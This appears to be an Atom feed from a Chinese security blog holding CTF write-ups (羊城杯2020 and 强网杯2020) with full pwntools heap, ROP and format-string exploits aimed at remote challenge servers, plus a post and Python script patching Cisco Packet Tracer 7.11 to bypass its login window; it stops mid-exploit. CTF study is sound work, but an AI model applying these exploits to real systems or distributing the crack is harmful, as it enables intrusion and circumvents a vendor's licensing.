<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Chumen77&#39;s Blog</title>
  
  <subtitle>永远相信美好的事情即将发生！</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://chumen77.xyz/"/>
  <updated>2020-09-15T14:43:39.483Z</updated>
  <id>http://chumen77.xyz/</id>
  
  <author>
    <name>chumen77</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>羊城杯2020部分wp</title>
    <link href="http://chumen77.xyz/2020/09/14/%E7%BE%8A%E5%9F%8E%E6%9D%AF2020%E9%83%A8%E5%88%86wp/"/>
    <id>http://chumen77.xyz/2020/09/14/羊城杯2020部分wp/</id>
    <published>2020-09-14T12:56:01.475Z</published>
    <updated>2020-09-15T14:43:39.483Z</updated>
    
    <content type="html"><![CDATA[<h1 id="羊城杯2020部分wp"><a href="#羊城杯2020部分wp" class="headerlink" title="羊城杯2020部分wp"></a>羊城杯2020部分wp</h1><h2 id="re"><a href="#re" class="headerlink" title="re"></a>re</h2><h3 id="login"><a href="#login" class="headerlink" title="login"></a>login</h3><p>Python exe的逆向。其中在修复pyc时，个人不是很熟悉，记录一下：</p><p> 在脱去以后，会有主程序，跟一个struct的文件。</p><p>要保证主程序与struct的前面的魔法字节是相同一样的。</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/yFiJmM.png" srcset="/img/loading.gif" alt><br><img src="http://qiqianyun.chumen77.xyz/uPic/r9gtZs.png" srcset="/img/loading.gif" alt><br>重点关注前16个字节，保证相同即可。<br>修复好pyc后，就可以进行反编译。<br>剩下的就是逆算法，需要用到z3。</p><h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><pre><code class="python">#!/usr/bin/env python2.7from z3 import *&#39;&#39;&#39;a1 = Int(&#39;a1&#39;)a2 = Int(&#39;a2&#39;)a3 = Int(&#39;a3&#39;)a4 = Int(&#39;a4&#39;)a5 = Int(&#39;a5&#39;)a6 = Int(&#39;a6&#39;)a7 = Int(&#39;a7&#39;)a8 = Int(&#39;a8&#39;)a9 = Int(&#39;a9&#39;)a10 = Int(&#39;a10&#39;)a11 = Int(&#39;a11&#39;)a12 = Int(&#39;a12&#39;)a13 = Int(&#39;a13&#39;)a14 = Int(&#39;a14&#39;)s.add(a1 * 88 + a2 * 67 + a3 * 65 - a4 * 5 + a5 * 43 + a6 * 89 + a7 * 25 + a8 * 13 - a9 * 36 + a10 * 15 + a11 * 11 + a12 * 47 - a13 * 60 + a14 * 29 == 22748)s.add(a1 * 89 + a2 * 7 + a3 * 12 - a4 * 25 + a5 * 41 + a6 * 23 + a7 * 20 - a8 * 66 + a9 * 31 + a10 * 8 + a11 * 2 - a12 * 41 - a13 * 39 + a14 * 17 == 7258)s.add(a1 * 28 + a2 * 35 + a3 * 16 - a4 * 65 + a5 * 53 + a6 * 39 + a7 * 27 + a8 * 15 - a9 * 33 + a10 * 13 + a11 * 101 + a12 * 90 - a13 * 34 + a14 * 23 == 26190)s.add(a1 * 23 + a2 * 34 + a3 * 35 - a4 * 59 + a5 * 49 + a6 * 81 + a7 * 25 + a8 * (2 ** 7) - a9 * 32 + a10 * 75 + a11 * 81 + a12 * 47 - a13 * 60 + a14 * 29 == 37136)s.add(a1 * 38 + a2 * 97 + a3 * 35 - a4 * 52 + a5 * 42 + a6 * 79 + a7 * 90 + a8 * 23 - a9 * 36 + a10 * 57 + a11 * 81 + a12 * 42 - a13 * 62 - a14 * 11 == 27915)s.add(a1 * 22 + a2 * 27 + a3 * 35 - a4 * 45 + a5 * 47 + a6 * 49 + a7 * 29 + a8 * 18 - a9 * 26 + a10 * 35 + a11 * 41 + a12 * 40 - a13 * 61 + a14 * 28 == 17298)s.add(a1 * 12 + a2 * 45 + a3 * 35 - a4 * 9 - a5 * 42 + a6 * 86 + a7 * 23 + a8 * 85 - a9 * 47 + a10 * 34 + a11 * 76 + a12 * 43 - a13 * 44 + a14 * 65 == 19875)s.add(a1 * 79 + a2 * 62 + a3 * 35 - a4 * 85 + a5 * 33 + a6 * 79 + a7 * 86 + a8 * 14 - a9 * 30 + a10 * 25 + a11 * 11 + a12 * 57 - a13 * 50 - a14 * 9 == 22784)s.add(a1 * 8 + a2 * 6 + a3 * 64 - a4 * 85 + a5 * 73 + a6 * 29 + a7 * 2 + a8 * 23 - a9 * 36 + a10 * 5 + a11 * 2 + a12 * 47 - a13 * 64 + a14 * 27 == 9710)s.add(a1 * 67 - a2 * 68 + a3 * 68 - a4 * 51 - a5 * 43 + a6 * 81 + a7 * 22 - a8 * 12 - a9 * 38 + a10 * 75 + a11 * 41 + a12 * 27 - a13 * 52 + a14 * 31 == 13376)s.add(a1 * 85 + a2 * 63 + a3 * 5 - a4 * 51 + a5 * 44 + a6 * 36 + a7 * 28 + a8 * 15 - a9 * 6 + a10 * 45 + a11 * 31 + a12 * 7 - a13 * 67 + a14 * 78 == 24065)s.add(a1 * 47 + a2 * 64 + a3 * 66 - a4 * 5 + a5 * 43 + a6 * 112 + a7 * 25 + a8 * 13 - a9 * 35 + a10 * 95 + a11 * 21 + a12 * 43 - a13 * 61 + a14 * 20 == 27687)s.add(a1 * 89 + a2 * 67 + a3 * 85 - a4 * 25 + a5 * 49 + a6 * 89 + a7 * 23 + a8 * 56 - a9 * 92 + a10 * 14 + a11 * 89 + a12 * 47 - a13 * 61 - a14 * 29 == 29250)s.add(a1 * 95 + a2 * 34 + a3 * 62 - a4 * 9 - a5 * 43 + a6 * 83 + a7 * 25 + a8 * 12 - a9 * 36 + a10 * 16 + a11 * 51 + a12 * 47 - a13 * 60 - a14 * 24 == 15317)if s.check() == sat:    result = s.model()    print result&#39;&#39;&#39;&#39;&#39;&#39;[a2 = 24, a13 = 88, a6 = 43, a9 = 52, a14 = 33, a5 = 104, a12 = 74, a7 = 28, a1 = 119, a10 = 108, a11 = 88, a8 = 91, a4 = 7, a3 = 10]&#39;&#39;&#39;key = [10,24,119,7,104,43,28,91,108,52,88,74,88,33]flag = &#39; &#39;for i in range(13,0,-1):    key[i-1] = key[i] ^ key[i - 1]    flag += chr(key[i-1])flag = flag[::-1]flag += chr(33)print(flag)</code></pre><p>其中在z3中处理逻辑运算时，是很特殊的，这个需要注意，具体可以看z3的官方文档。<br>可以参考：<br><a href="https://arabelatso.github.io/2018/06/14/Z3%20API%20in%20Python/" target="_blank" rel="noopener">https://arabelatso.github.io/2018/06/14/Z3%20API%20in%20Python/</a></p><p>还有遇到逻辑左移右移：</p><pre><code class="python">1. “&gt;&gt;”int x = 16; printf(&quot;%d\n&quot;, x &gt;&gt; 1);先将x转成二进制 10000, 不读最后一位， 输出 1000， 即为8;右移一位相当于数值除以22. “&lt;&lt;”int x = 16; printf(&quot;%d\n&quot;, x &lt;&lt; 1);先将x转成二进制 10000, 往最后再读取一位(0, 或根据是否已经有移位)， 输出 100000， 即为32;左移，若移动位数K等于或大于数据长度N,通常只移动K mod N 位数左移一位相当于数值乘以2</code></pre><p>在这里是左移7，也就是乘 2 的7次方。</p><h3 id="easyre"><a href="#easyre" class="headerlink" title="easyre"></a>easyre</h3><h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><p>3层加密.</p><ul><li>一个base64</li><li>一个以13字节，分割字符，进行移位</li><li>单字节凯撒加密，但是也加入了对数字的处理</li></ul><h4 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h4><pre><code class="python">import base64key = &#39;EmBmP5Pmn7QcPU4gLYKv5QcMmB3PWHcP5YkPq3=cT6QckkPckoRG&#39;key = [ord(c) for c in key]buf = [0]*52for i in range(len(key)):    if key[i] &gt; 64 and key[i] &lt;=90:        buf[i] = (key[i] - 65 - 3) % 26 + 65        continue    if key[i] &gt; 96 and key[i] &lt;=122:        buf[i] =  (key[i] - 97 - 3) % 26 + 0x61        continue    if key[i] &gt; 47 and key[i] &lt;=57:        buf[i] = (key[i] - 48 - 3) % 10 + 48        continue    buf[i] = key[i]buf = [chr(c) for c in buf]key2 = &#39;&#39;for i in buf:    key2 += ikey2 = key2[13:26] + key2[39:52] + key2[:13] + key2[26:39]flag = base64.b64decode(key2)print(flag)</code></pre><h2 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h2><h3 id="sing-in"><a href="#sing-in" class="headerlink" title="sing in"></a>sing in</h3><p>入门堆题，存在uaf，进行<code>fastbin attcak</code>即可。</p><h4 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h4><pre><code class="python">from pwn import *import timelocal_file  = &#39;./pwn&#39;elf = ELF(local_file)context.log_level = &#39;debug&#39;debug = 0if debug:    io = process(local_file)    libc = elf.libcelse:    io = remote(&#39;183.129.189.60&#39;,10029)    libc = elf.libc    #libc = ELF(&#39;.&#39;)context.arch = elf.archcontext.terminal = [&#39;tmux&#39;,&#39;neww&#39;]#,&#39;&#39;splitw&#39;,&#39;-h&#39;rce16 = [0x45216,0x4526a,0xf02a4,0xf1147]s      = lambda data               :io.send(data) sa      = lambda delim,data         :io.sendafter(delim, data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(delim, data)r      = lambda numb=4096          :io.recv(numb)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))info_addr = lambda tag, addr        :io.info(tag + &#39;==&gt;&#39; +&#39;: {:#x}&#39;.format(addr))itr     = lambda                    :io.interactive()def debug():    # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)    gdb.attach(io)    pause()def add(size,name,mes):    sla(&#39;Your choice :&#39;,&#39;1&#39;)    sla(&#39;size&#39;,str(size))    sa(&#39;name&#39;,str(name))    sla(&#39;mes&#39;,str(mes))def show():    sla(&#39;Your choice :&#39;,&#39;2&#39;)def free(idx):    sla(&#39;Your choice :&#39;,&#39;3&#39;)    sla(&#39;index:&#39;,str(idx))payload = &#39;a&#39; * 0x60mes = &#39;b&#39; * 23add(0x100,payload,mes)add(0x60,payload,mes)free(0)add(0x60,&#39; &#39;,mes)show()ru(&quot;Game[2]&#39;s name :&quot;)libc_base = uu64(r(6)) - 0x3c4b20info_addr(&#39;libc_base&#39;,libc_base)free(2)free(1)free(2)malloc_hook = libc_base + 0x3c4aedadd(0x60,p64(malloc_hook),p64(malloc_hook))add(0x60,p64(malloc_hook),p64(malloc_hook))add(0x60,p64(malloc_hook),p64(malloc_hook))one = 0x4527a + libc_basepayload = &#39;1&#39; * 11 + p64(0) + p64(one)add(0x60,payload,payload)itr()</code></pre><p>其中可以申请一个堆，进行getshell，也可以同时2次free同一个chunk，触发报错函数，而调用报错函数的时候又会用到<code>malloc_hook</code>，从而getshell。</p><h3 id="babypwn"><a href="#babypwn" class="headerlink" title="babypwn"></a>babypwn</h3><h4 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h4><ul><li>只有add和del功能</li><li>存在uaf</li><li>只能申请&lt;0x70的堆块</li></ul><h4 id="前置技能"><a href="#前置技能" class="headerlink" title="前置技能"></a>前置技能</h4><p>需要利用scanf函数来触发<code>malloc_consolidate</code>，使<strong>相邻fastbin堆块</strong>进行合并，并放入unsortedbin的 队列。</p><p>参考链接：</p><p><a href="https://www.anquanke.com/post/id/176139" target="_blank" rel="noopener">https://www.anquanke.com/post/id/176139</a></p><p><a href="https://blog.csdn.net/plus_re/article/details/79265805" target="_blank" rel="noopener">https://blog.csdn.net/plus_re/article/details/79265805</a></p><p><code>malloc_consolidate</code>具体步骤如下：</p><ol><li>判断fastbin是否初始化，如果未初始化，则进行初始化然后退出。</li><li>按照fastbin由小到大的顺序（0x20 ,0x30 ,0x40这个顺序）合并chunk，每种相同大小的fastbin中chunk的处理顺序是从fastbin-&gt;fd开始取，下一个处理的是p-&gt;fd，依次类推。</li><li>首先尝试合并<code>pre_chunk</code>。</li><li>然后尝试合并<code>next_chunk</code>：如果<code>next_chunk</code>是<code>top_chunk</code>，则直接合并到<code>top_chunk</code>，然后进行第六步；如果<code>next_chunk</code>不是<code>top_chunk</code>，尝试合并。</li><li>将处理完的chunk插入到unsorted bin头部。</li><li>获取下一个空闲的fastbin，回到第二步，直到清空所有fastbin中的chunk，然后退出。</li></ol><h4 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h4><ul><li>利用scanf函数来触发<code>malloc_consolidate</code>，使<strong>相邻fastbin堆块</strong>进行合并，并放入unsortedbin的 队列，在堆上留下libc的相关地址</li><li>利用fastbin attack ，打<code>__IO_2_1_stdout</code>，泄漏libc</li><li>利用fastbin attack ，打<code>malloc_hook</code></li></ul><p>难点在申请堆块的数量,题目限制了19个，是刚刚够用。</p><h4 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h4><pre><code class="python">from pwn import *import timelocal_file  = &#39;./pwn&#39;elf = ELF(local_file)context.log_level = &#39;debug&#39;debug = 1if debug:    io = process(local_file)    libc = elf.libcelse:    io = remote(&#39;node3.buuoj.cn&#39;,27411)    libc = elf.libc    #libc = ELF(&#39;.&#39;)context.arch = elf.archcontext.terminal = [&#39;tmux&#39;,&#39;neww&#39;]#,&#39;&#39;splitw&#39;,&#39;-h&#39;rce16 = [0x45216,0x4526a,0xf02a4,0xf1147]s      = lambda data               :io.send(data) sa      = lambda delim,data         :io.sendafter(delim, data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(delim, data)r      = lambda numb=4096          :io.recv(numb)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))info_addr = lambda tag, addr        :io.info(tag + &#39;==&gt;&#39; +&#39;: {:#x}&#39;.format(addr))itr     = lambda                    :io.interactive()def debug():    # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)    gdb.attach(io)    pause()def add(size,name,mes):    sla(&#39;Your choice :&#39;,&#39;1&#39;)    sla(&#39;size&#39;,str(size))    sa(&quot;game&#39;s name:&quot;,str(name))    sla(&#39;mes&#39;,str(mes))def free(idx):    sla(&#39;Your choice :&#39;,&#39;2&#39;)    sla(&#39;index:&#39;,str(idx))def leak_addr():    payload = &#39;a&#39; * 0x28    mes = &#39;2&#39; * 23    add(0x28,payload,mes) #0    add(0x28,payload,mes) #1    add(0x28,payload,mes) #2    free(0)    free(1)    free(2)    add(0x68,payload,mes) #3    add(0x68,payload,mes) #4    add(0x68,payload,mes) #5    add(0x68,payload,mes) #6    free(3)    free(4)    free(5)    # debug()    sla(&#39;Your choice :&#39;,&#39;2&#39;)    sl(&#39;1&#39;*0x500)    free(0)    free(1)    free(2)    add(0x68,p16(0xb5dd),&#39;1&#39;) #7    add(0x68,p16(0xb5dd),&#39;1&#39;) #8    free(6)    free(7)    free(6)    add(0x68,p8(0x90),&#39;1&#39;) #9    add(0x68,&#39;1&#39;,&#39;1&#39;) #10    add(0x68,&#39;1&#39;,&#39;1&#39;) #11    add(0x68,&#39;1&#39;,&#39;1&#39;) #12    payload = &#39;b&#39; * 0x33 + p64(0xfbad3c80) + p64(0) * 3 + p8(0)    sla(&#39;Your choice :&#39;,&#39;1&#39;)    sla(&#39;size&#39;,&#39;104&#39;) #13    sa(&#39;name&#39;,payload)leak = 0while True:    try:        leak_addr()        ss = io.recvuntil(chr(0x7f),timeout = 0.5)        if len(ss) == 0:            raise Exception(&#39;&#39;)        io.recv(10)        leak = uu64(r(6))        if leak == 0x7ff81b57b6a3:            raise Exception(&#39;&#39;)        break    except Exception:        io.close()        io = process(&#39;./pwn&#39;)        # io = remote(&#39;39.101.184.181&#39;,10000)        continueinfo_addr(&#39;leak&#39;,leak)libc_addr = leak - 0x3c56a3info_addr(&#39;libc_base&#39;,libc_addr)ru(&#39;age&#39;)sl(&#39;1&#39;)free(10)free(11)free(10)malloc_hook = 0x3c4aed + libc_addradd(0x68,p64(malloc_hook),&#39;1&#39;)add(0x68,&#39;1&#39;,&#39;1&#39;)add(0x68,&#39;1&#39;,&#39;1&#39;)one_rec = 0xf0364 + libc_addrpayload = &#39;1&#39; * (0x13-8) + p64(0)+ p64(one_rec)add(0x68,payload,&#39;1&#39;)free(6)free(6)itr()</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;羊城杯2020部分wp&quot;&gt;&lt;a href=&quot;#羊城杯2020部分wp&quot; class=&quot;headerlink&quot; title=&quot;羊城杯2020部分wp&quot;&gt;&lt;/a&gt;羊城杯2020部分wp&lt;/h1&gt;&lt;h2 id=&quot;re&quot;&gt;&lt;a href=&quot;#re&quot; class=&quot;head
      
    
    </summary>
    
    
      <category term="pwn" scheme="http://chumen77.xyz/tags/pwn/"/>
    
      <category term="re" scheme="http://chumen77.xyz/tags/re/"/>
    
  </entry>
  
  <entry>
    <title>实战去除packet tracer登陆窗口</title>
    <link href="http://chumen77.xyz/2020/09/07/%E5%AE%9E%E6%88%98%E5%8E%BB%E9%99%A4packet%20tracer%E7%99%BB%E9%99%86%E7%AA%97%E5%8F%A3/"/>
    <id>http://chumen77.xyz/2020/09/07/实战去除packet tracer登陆窗口/</id>
    <published>2020-09-07T09:11:40.744Z</published>
    <updated>2020-09-12T09:14:20.389Z</updated>
    
    <content type="html"><![CDATA[<h1 id="实战去除思科packet-tracer登陆窗口"><a href="#实战去除思科packet-tracer登陆窗口" class="headerlink" title="实战去除思科packet tracer登陆窗口"></a>实战去除思科packet tracer登陆窗口</h1><h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>专业课开设了路由交换这门课，其中要经常使用packet tracer这个软件，但是没有注册的话，每次登陆都需要等待15s，就尝试破解一下。</p><h2 id="目标"><a href="#目标" class="headerlink" title="目标"></a>目标</h2><p>破除等待的15s，最好直接去除掉登陆窗口。但是老师上课给我们演示过，有个吾爱破解的插件是直接破解掉登陆窗口的，就直接奔着这个目标去。</p><h2 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h2><ul><li>win7 模拟器</li><li>packet tracer 7.11</li><li>x64dbg</li></ul><h2 id="破解过程记录"><a href="#破解过程记录" class="headerlink" title="破解过程记录"></a>破解过程记录</h2><h3 id="寻找突破口"><a href="#寻找突破口" class="headerlink" title="寻找突破口"></a>寻找突破口</h3><p>￼在弹出登陆界面时，最上方会有 <code>netacad.com Login</code>的字眼，先就选择这里作为关键字符串。<br>￼<br><img src="http://qiqianyun.chumen77.xyz/uPic/K55z1P.jpg" srcset="/img/loading.gif" alt><br>在这个exe的程序下搜索字符串。<br><img src="http://qiqianyun.chumen77.xyz/uPic/H1st15.jpg" srcset="/img/loading.gif" alt><br>端口可疑字符串对应的汇编指令。</p><p>然后开始f9一直运行，在这个<code>netacad.com Login</code>，运行其后的软件会发现，的确开启了登陆的窗口。这样就可以确定，关键处就在这里。<br><img src="http://qiqianyun.chumen77.xyz/uPic/6Hr3Tw.png" srcset="/img/loading.gif" alt><br>向下看可以看到，一些登陆失败的字符串，那就无疑是这一块的函数控制着这个登陆窗口。</p><p>向上看可以看到，有几个小跳转，和一个大跳转，然后追过去可以发现，是可以绕过这些关键函数的。那就很简单了，尝试改成<code>jmp</code> 无条件跳转一下试一试。</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/f42dGL.png" srcset="/img/loading.gif" alt></p><p>然后直接运行一下，然后的确是成功了，去掉了登陆框。</p><p>然后进行保存补丁，替换主程序即可。</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/OikyWs.png" srcset="/img/loading.gif" alt></p><h3 id="小总结"><a href="#小总结" class="headerlink" title="小总结"></a>小总结</h3><p>的确是找到了关键处，感觉整个过程还是很简单的，由于前人经验就是从登陆界面下手的，我也是直接跟随这个思路操作。在完工以后，尝试去搞一下15s哪里的验证，想点一下直接变为0s，可以点击确认，发现是的确麻烦也没有成功就放弃了。</p><h2 id="半自动化打补丁"><a href="#半自动化打补丁" class="headerlink" title="半自动化打补丁"></a>半自动化打补丁</h2><p>不太会写c，用python 写了打补丁的程序，确保本机有python2的运行环境。然后把脚本放在其安装路径的bin目录下，运行即可。</p><p>也可以把程序拖出来，打完补丁后替换原来的程序即可。</p><pre><code class="python">#!/usr/bin/env python2.7import structimport osdef WriteFile():    with open(&#39;PacketTracer7.exe&#39;,&#39;r&#39;) as f:         dt = f.read()    dt = dt[:0x17a5245]+&#39;\xe9\xee\x04\x00\x00\x90&#39;+dt[0x17a524b:]    with open(&#39;PacketTracer7.exe&#39;, &#39;w&#39;) as f:        f.write(dt)if __name__ == &#39;__main__&#39;:    WriteFile()</code></pre><p>针对的只是7.11。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;实战去除思科packet-tracer登陆窗口&quot;&gt;&lt;a href=&quot;#实战去除思科packet-tracer登陆窗口&quot; class=&quot;headerlink&quot; title=&quot;实战去除思科packet tracer登陆窗口&quot;&gt;&lt;/a&gt;实战去除思科packet trac
      
    
    </summary>
    
    
      <category term="re" scheme="http://chumen77.xyz/tags/re/"/>
    
  </entry>
  
  <entry>
    <title>强网杯2020部分题目</title>
    <link href="http://chumen77.xyz/2020/08/24/%E5%BC%BA%E7%BD%91%E6%9D%AF2020%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE/"/>
    <id>http://chumen77.xyz/2020/08/24/强网杯2020部分题目/</id>
    <published>2020-08-24T02:34:05.216Z</published>
    <updated>2020-09-15T15:09:40.891Z</updated>
    
    <content type="html"><![CDATA[<h1 id="强网杯2020-部分题目"><a href="#强网杯2020-部分题目" class="headerlink" title="强网杯2020 部分题目"></a>强网杯2020 部分题目</h1><h2 id="babymessage"><a href="#babymessage" class="headerlink" title="babymessage"></a>babymessage</h2><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><pre><code>   Arch:     amd64-64-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (0x3fe000)</code></pre><p>基本保护不算多。</p><p>是一个伪堆题。</p><h4 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h4><p>在 <code>leave_message(v1)</code>函数这里的v1上来取值就是16</p><pre><code class="c">__int64 __fastcall leave_message(unsigned int a1){  int v1; // ST14_4  __int64 v3; // [rsp+18h] [rbp-8h]  puts(&quot;message: &quot;);  v1 = read(0, &amp;v3, a1);  strncpy(buf, (const char *)&amp;v3, v1);  buf[v1] = 0;  puts(&quot;done!\n&quot;);  return 0LL;}</code></pre><p>进入以后可以发现，v3是只有8字节大小的，可以溢出8字节，可以覆盖到rbp。</p><h5 id="用途"><a href="#用途" class="headerlink" title="用途"></a>用途</h5><pre><code>.text:0000000000400985 ; 22:         if ( v1 &gt; 256 ).text:0000000000400985                 cmp     [rbp+var_4], 100h.text:000000000040098C                 jle     short loc_400995.text:000000000040098E ; 23:           v1 = 256;.text:000000000040098E                 mov     [rbp+var_4], 100h.text:0000000000400995 ; 24:         leave_message(v1);</code></pre><p>在进入<code>leave_message(v1)</code>前v1有一个对于0x100大小的判断，要是v1大于0x100就给设置为0x100。这就可以实现栈溢出，进行rop。</p><p>怎么控制v1：</p><pre><code>signed int v1; // [rsp+Ch] [rbp-4h]</code></pre><p>可以明显看到v1在rbp-4的地址，然后rbp，也可以进行溢出覆盖，覆盖到合适的地方后，保障-4后，有个int大小的大于等于0x100的值即可。</p><p>这个合适地址，可以从<code>leave_name()</code> 下手，因为其往bss段读了值。</p><pre><code>byte_6010D0[(signed int)read(0, byte_6010D0, 4uLL)] = 0;</code></pre><p><img src="http://qiqianyun.chumen77.xyz/uPic/8uyl03.png" srcset="/img/loading.gif" alt></p><h3 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h3><ul><li>构造rop链，泄漏出libc的地址，返回start，让程序重新跑起来，清理栈</li><li>再次利用，控制ret address 为<code>one_gadget</code></li></ul><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *import timelocal_file  = &#39;./babymessage&#39;elf = ELF(local_file)context.log_level = &#39;debug&#39;debug = 0if debug:    io = process(local_file)    libc = elf.libcelse:    io = remote(&#39;123.56.170.202&#39;,21342)    libc = elf.libc    libc = ELF(&#39;./libc-2.27.so&#39;)context.arch = elf.archcontext.terminal = [&#39;tmux&#39;,&#39;neww&#39;]#,&#39;&#39;splitw&#39;,&#39;-h&#39;rce18 = [0x4f2c5,0x4f322,0x10a38c]arae18 = 0x3ebca0s      = lambda data               :io.send(data) sa      = lambda delim,data         :io.sendafter(delim, data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(delim, data)r      = lambda numb=4096          :io.recv(numb)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))info_addr = lambda tag, addr        :io.info(tag + &#39;==&gt;&#39; +&#39;: {:#x}&#39;.format(addr))itr     = lambda                    :io.interactive()def debug():    # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)    gdb.attach(io)    pause()pop_rdi = 0x0000000000400ac3start = 0x04006E0sla(&#39;choice&#39;,&#39;1&#39;)sa(&#39;name&#39;,p32(0xffff))sla(&#39;choice&#39;,&#39;2&#39;)payload = p64(0x02000200) + p64(0x06010D0+4)sa(&#39;mes&#39;,payload)sla(&#39;choice&#39;,&#39;2&#39;)rop = flat([pop_rdi,elf.got[&#39;__libc_start_main&#39;],elf.plt[&#39;puts&#39;],start])payload = p64(0x02000200) + p64(0x06010D0+4)payload +=ropsa(&#39;mes&#39;,payload)ru(&#39;done!&#39;)r(2)libc_base = uu64(r(6)) - libc.sym[&#39;__libc_start_main&#39;]info_addr(&#39;libc_base&#39;,libc_base)sla(&#39;choice&#39;,&#39;1&#39;)sa(&#39;name&#39;,p32(0xffff))sla(&#39;choice&#39;,&#39;2&#39;)# debug()payload = p64(0x02000200) + p64(0x06010D0+4)sa(&#39;mes&#39;,payload)rec = 0x10a45c + libc_basesla(&#39;choice&#39;,&#39;2&#39;)rop = p64(rec)payload = p64(0x02000200) + p64(0x06010D0+4)payload +=ropsa(&#39;mes&#39;,payload)itr()</code></pre><pre><code class="python">flag{f4c1c2c2407055f2665dec486e7d1b16}</code></pre><h2 id="Siri"><a href="#Siri" class="headerlink" title="Siri"></a>Siri</h2><h3 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h3><p>保护全开。栈上的格式化字符串漏洞，并且可以无限次触发。</p><h4 id="漏洞点-1"><a href="#漏洞点-1" class="headerlink" title="漏洞点"></a>漏洞点</h4><pre><code class="c">signed __int64 __fastcall sub_1212(const char *a1){  char *v2; // [rsp+18h] [rbp-128h]  char s; // [rsp+20h] [rbp-120h]  unsigned __int64 v4; // [rsp+138h] [rbp-8h]  v4 = __readfsqword(0x28u);  v2 = strstr(a1, &quot;Remind me to &quot;);  if ( !v2 )    return 0LL;  memset(&amp;s, 0, 0x110uLL);  sprintf(&amp;s, &quot;&gt;&gt;&gt; OK, I&#39;ll remind you to %s&quot;, v2 + 13);  printf(&amp;s);  puts(&amp;::s);  return 1LL;}</code></pre><p>发现存在格式化字符串，但是你所输入的都会被sprintf处理以后给printf函数。由于其是<code>%s</code>来处理数据，这就让直接在栈上写地址，然后攻击造成了难度。<br>但是调试可以发现，其实输入的东西还会保留在栈上，因为sprintf处理数据也是从栈上拿的，所以会被保留的。</p><h4 id="攻击-1"><a href="#攻击-1" class="headerlink" title="攻击"></a>攻击</h4><ul><li>第一次触发，泄漏出libc地址，stack地址。</li><li>执行到printf准备触发格式化字符串漏洞时，用sprintf残留栈上的数据（在0x100后），这个需要精心构造好后，进行攻击ret address。需要一次性改好。</li></ul><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *import timelocal_file  = &#39;./pwn&#39;elf = ELF(local_file)context.log_level = &#39;debug&#39;debug = 0if debug:    io = process(local_file)    libc = elf.libcelse:    io = remote(&#39;123.56.170.202&#39;,12124)    # libc = elf.libc    libc = ELF(&#39;./libc.so.6&#39;)context.arch = elf.archcontext.terminal = [&#39;tmux&#39;,&#39;neww&#39;]#,&#39;&#39;splitw&#39;,&#39;-h&#39;rce16 = [0x45216,0x4526a,0xf02a4,0xf1147]rce18 = [0x4f2c5,0x4f322,0x10a38c]s      = lambda data               :io.send(data) sa      = lambda delim,data         :io.sendafter(delim, data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(delim, data)r      = lambda numb=4096          :io.recv(numb)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))info_addr = lambda tag, addr        :io.info(tag + &#39;==&gt;&#39; +&#39;: {:#x}&#39;.format(addr))itr     = lambda                    :io.interactive()def debug():    gdb.attach(io)    pause()def start_attc():    sla(&#39;&gt;&gt;&#39;,&#39;Hey Siri!&#39;)    r()a = &#39;Remind me to &#39;start_attc()payload = str(a) + &#39;%83$p&#39; + &#39;bbb&#39; + &#39;%7$p&#39;# ru(&#39;&gt;&gt;&gt;&#39;)s(payload)ru(&#39;0x&#39;)libc_base = int(r(12),16) - 0x21b97info_addr(&#39;libc_base&#39;,libc_base)ru(&#39;bbb0x&#39;)stack_base = int(r(12),16) - 0x150info_addr(&#39;stack_base&#39;,stack_base)tag = stack_base + 0x148start_attc()def fmt_short(prev,val,idx,byte = 2):    result = &quot;&quot;    if prev &lt; val :        result += 